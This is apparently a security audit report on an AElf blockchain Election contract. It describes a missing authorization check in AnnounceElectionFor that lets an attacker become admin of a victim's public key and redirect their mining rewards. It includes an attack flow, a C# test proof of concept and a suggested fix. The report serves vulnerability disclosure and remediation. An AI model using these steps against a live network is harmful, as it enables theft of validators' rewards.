# Audit Report

## Title
Unauthorized Admin Takeover via AnnounceElectionFor Enables Reward Redirection

## Summary
The `AnnounceElectionFor` method in the Election Contract allows any caller to announce candidacy for an arbitrary public key without verifying ownership. Attackers can front-run legitimate candidate announcements to become admin of target public keys and permanently redirect all mining/candidate rewards to attacker-controlled addresses. Victims cannot recover without Parliament intervention.

## Finding Description

The Election Contract provides two methods for announcing candidacy. While `AnnounceElection` properly verifies ownership by recovering the public key from the transaction signature [1](#0-0) , the `AnnounceElectionFor` method accepts an arbitrary pubkey parameter and sets an admin without any authorization check.

The vulnerability exists because `AnnounceElectionFor` directly calls the private `AnnounceElection(byte[])` method [2](#0-1)  which only validates that the pubkey is not an initial miner, not already a candidate, and not banned [3](#0-2)  but never verifies the caller has authorization to announce for that pubkey. The admin is set directly without verification [4](#0-3) .

**Attack Flow:**

1. Attacker identifies a target pubkey that hasn't announced candidacy yet
2. Attacker calls `AnnounceElectionFor` with the victim's pubkey and attacker's address as admin
3. The admin is recorded in `State.CandidateAdmins[pubkey]` without authorization verification
4. Attacker calls `TreasuryContract.SetProfitsReceiver` to redirect rewards to attacker's address
5. `SetProfitsReceiver` validates admin permission via `GetCandidateAdmin` [5](#0-4)  which returns the attacker's address [6](#0-5) 
6. Mining rewards are distributed to the attacker's address because `GetProfitsReceiver` returns the value from `ProfitsReceiverMap` [7](#0-6)  which is used during reward distribution [8](#0-7) 

**Why Recovery Is Impossible:**

The `SetCandidateAdmin` method that could change the admin requires the caller to be either Parliament or the current admin [9](#0-8) . Since the attacker is already the admin, the legitimate pubkey owner cannot change it without controlling Parliament.

## Impact Explanation

**Direct Financial Loss:**
All mining rewards for the hijacked pubkey flow to the attacker instead of the legitimate owner, including basic miner rewards, welcome rewards for newly elected miners, flexible rewards, and backup subsidy for candidates in data center ranking.

**Systemic Consequences:**
- Legitimate validators lose economic incentive if rewards are stolen, undermining network security
- Victims must generate entirely new keypairs, losing any reputation or history associated with the original pubkey
- The fundamental assumption that miners control their own reward destinations is violated

**Affected Parties:**
- New validators (non-initial-miners) preparing to announce candidacy
- Any known validator pubkeys that haven't announced yet
- The broader ecosystem's trust in reward distribution fairness

Note: Initial miners are NOT affected because the private `AnnounceElection(byte[])` method explicitly blocks initial miner pubkeys from being announced [10](#0-9) .

## Likelihood Explanation

**Attacker Requirements:**
- Capital: 100,000 ELF to pay the `LockTokenForElection` deposit [11](#0-10) 
- This capital is fully recoverable by calling `QuitElection` as admin, which returns funds to the sponsor [12](#0-11) 

**Attack Complexity:**
- Very Low: Single transaction call to `AnnounceElectionFor`
- No special privileges required beyond sufficient ELF balance
- No race conditions beyond front-running the legitimate announcement

**Economic Rationality:**
- Mining rewards per term significantly exceed 100,000 ELF deposit
- Attacker gets deposit back if victim never becomes miner
- High ROI if victim pubkey gets elected
- Can target multiple pubkeys simultaneously

**Detection Difficulty:**
- Attack is indistinguishable from legitimate sponsored announcements (the intended use case demonstrated in tests [13](#0-12) )
- No on-chain signal that the admin is not the legitimate owner
- Victim only discovers after attempting to announce or claim rewards

**Probability: HIGH** - The attack is deterministic, economically profitable, technically trivial, and has no preventive controls.

## Recommendation

Add authorization verification in `AnnounceElectionFor` to ensure the caller has permission to set an admin for the target pubkey. This can be implemented by:

1. **Signature Verification**: Require the input to include a signature from the candidate's private key proving they consent to the admin assignment
2. **Pre-registration**: Require candidates to pre-register their intended admin through a method that verifies pubkey ownership (similar to `AnnounceElection`)
3. **Whitelist Mechanism**: Implement a whitelist where pubkey owners can pre-approve specific addresses to announce on their behalf

Example fix for signature verification approach:
```csharp
public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
{
    // Verify signature proves candidate consents
    var message = HashHelper.ComputeFrom(input.Admin);
    var recovered = Context.RecoverPublicKey(input.Signature, message.ToByteArray());
    Assert(recovered.ToHex() == input.Pubkey, "Invalid signature from candidate.");
    
    // Rest of existing logic...
}
```

## Proof of Concept

```csharp
[Fact]
public async Task AnnounceElectionFor_AdminTakeover_Attack()
{
    // Setup: Victim keypair (hasn't announced yet)
    var victimKeyPair = ValidationDataCenterKeyPairs[0];
    var victimPubkey = victimKeyPair.PublicKey.ToHex();
    
    // Setup: Attacker keypair
    var attackerKeyPair = ValidationDataCenterKeyPairs[1];
    var attackerAddress = Address.FromPublicKey(attackerKeyPair.PublicKey);
    
    // Step 1: Attacker announces for victim's pubkey with attacker as admin
    var attackerStub = GetElectionContractTester(attackerKeyPair);
    await attackerStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
    {
        Pubkey = victimPubkey,
        Admin = attackerAddress  // Attacker sets themselves as admin
    });
    
    // Verify: Attacker is now admin
    var admin = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = victimPubkey });
    admin.ShouldBe(attackerAddress);
    
    // Step 2: Attacker redirects rewards to their own address
    var attackerTreasuryStub = GetTreasuryContractTester(attackerKeyPair);
    var attackerRewardAddress = Address.FromPublicKey(attackerKeyPair.PublicKey);
    await attackerTreasuryStub.SetProfitsReceiver.SendAsync(new SetProfitsReceiverInput
    {
        Pubkey = victimPubkey,
        ProfitsReceiverAddress = attackerRewardAddress
    });
    
    // Verify: Rewards redirected to attacker
    var receiver = await TreasuryContractStub.GetProfitsReceiver.CallAsync(
        new StringValue { Value = victimPubkey });
    receiver.ShouldBe(attackerRewardAddress);
    
    // Verify: Victim cannot change admin (will fail)
    var victimStub = GetElectionContractTester(victimKeyPair);
    var result = await victimStub.SetCandidateAdmin.SendWithExceptionAsync(
        new SetCandidateAdminInput
        {
            Pubkey = victimPubkey,
            Admin = Address.FromPublicKey(victimKeyPair.PublicKey)
        });
    result.TransactionResult.Error.ShouldContain("No permission");
}
```

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L27-40)
```csharp
        if (Context.Sender != GetParliamentDefaultAddress())
        {
            if (State.CandidateAdmins[pubkey] == null)
            {
                // If admin is not set before (due to old contract code)
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
            }
            else
            {
                var oldCandidateAdmin = State.CandidateAdmins[pubkey];
                Assert(Context.Sender == oldCandidateAdmin, "No permission.");
            }
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L95-96)
```csharp
        var recoveredPublicKey = Context.RecoverPublicKey();
        AnnounceElection(recoveredPublicKey);
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-141)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[admin] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(pubkeyBytes));
        State.ManagedCandidatePubkeysMap[admin] = managedPubkeys;
        LockCandidateNativeToken();
        AddCandidateAsOption(pubkey);
        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        State.CandidateSponsorMap[input.Pubkey] = Context.Sender;
        return new Empty();
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L144-175)
```csharp
    private void AnnounceElection(byte[] pubkeyBytes)
    {
        var pubkey = pubkeyBytes.ToHex();
        var pubkeyByteString = ByteString.CopyFrom(pubkeyBytes);

        Assert(!State.InitialMiners.Value.Value.Contains(pubkeyByteString),
            "Initial miner cannot announce election.");

        var candidateInformation = State.CandidateInformationMap[pubkey];

        if (candidateInformation != null)
        {
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
            candidateInformation.AnnouncementTransactionId = Context.OriginTransactionId;
            candidateInformation.IsCurrentCandidate = true;
            // In this way we can keep history of current candidate, like terms, missed time slots, etc.
            State.CandidateInformationMap[pubkey] = candidateInformation;
        }
        else
        {
            Assert(!IsPubkeyBanned(pubkey), "This candidate already banned before.");
            State.CandidateInformationMap[pubkey] = new CandidateInformation
            {
                Pubkey = pubkey,
                AnnouncementTransactionId = Context.OriginTransactionId,
                IsCurrentCandidate = true
            };
        }

        State.Candidates.Value.Value.Add(pubkeyByteString);
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L236-249)
```csharp
        Assert(Context.Sender == State.CandidateAdmins[initialPubkey], "Only admin can quit election.");
        var candidateInformation = State.CandidateInformationMap[pubkey];

        // Unlock candidate's native token.
        var lockId = candidateInformation.AnnouncementTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = lockVirtualAddress,
            To = State.CandidateSponsorMap[input.Value] ?? Address.FromPublicKey(pubkeyBytes),
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Quit election."
        });
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L608-609)
```csharp
        var admin = State.ElectionContract.GetCandidateAdmin.Call(new StringValue {Value = input.Pubkey});
        Assert(Context.Sender == admin , "No permission.");
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L651-655)
```csharp
    private Address GetProfitsReceiver(string pubkey)
    {
        return State.ProfitsReceiverMap[pubkey] ??
               Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(pubkey));
    }
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L814-818)
```csharp
                    return new BeneficiaryShare
                    {
                        Beneficiary = GetProfitsReceiver(i.Pubkey),
                        Shares = shares
                    };
```

**File:** contract/AElf.Contracts.Election/ViewMethods.cs (L411-414)
```csharp
    public override Address GetCandidateAdmin(StringValue input)
    {
        return State.CandidateAdmins[State.InitialPubkeyMap[input.Value] ?? input.Value];
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContractConstants.cs (L5-5)
```csharp
    public const long LockTokenForElection = 100_000_00000000;
```

**File:** test/AElf.Contracts.Election.Tests/BVT/SponsorTests.cs (L16-49)
```csharp
    public async Task ElectionContract_AnnounceElectionFor_State_Test()
    {
        var candidatesKeyPair = ValidationDataCenterKeyPairs.First();
        var sponsorKeyPair = ValidationDataCenterKeyPairs.Last();
        var balanceBeforeAnnouncing = await GetNativeTokenBalance(sponsorKeyPair.PublicKey);

        // Execute AnnounceElectionFor.
        var electionStub = GetElectionContractTester(sponsorKeyPair);
        var candidateAdmin = Address.FromPublicKey(candidatesKeyPair.PublicKey);
        await electionStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
        {
            Admin = candidateAdmin,
            Pubkey = candidatesKeyPair.PublicKey.ToHex()
        });

        var balanceAfterAnnouncing = await GetNativeTokenBalance(sponsorKeyPair.PublicKey);
        balanceAfterAnnouncing.ShouldBe(balanceBeforeAnnouncing - ElectionContractConstants.LockTokenForElection);

        var votingItem = await VoteContractStub.GetVotingItem.CallAsync(new GetVotingItemInput
        {
            VotingItemId = MinerElectionVotingItemId
        });
        votingItem.Options.Count.ShouldBe(1);
        votingItem.Options.ShouldContain(candidatesKeyPair.PublicKey.ToHex());
        var dataCenterList = await ElectionContractStub.GetDataCenterRankingList.CallAsync(new Empty());
        dataCenterList.DataCenters.ContainsKey(candidatesKeyPair.PublicKey.ToHex()).ShouldBeTrue();
        var subsidy = ProfitItemsIds[ProfitType.BackupSubsidy];
        var profitDetail = await ProfitContractStub.GetProfitDetails.CallAsync(new GetProfitDetailsInput
        {
            SchemeId = subsidy,
            Beneficiary = Address.FromPublicKey(candidatesKeyPair.PublicKey)
        });
        profitDetail.Details.Count.ShouldBe(1);
    }
```
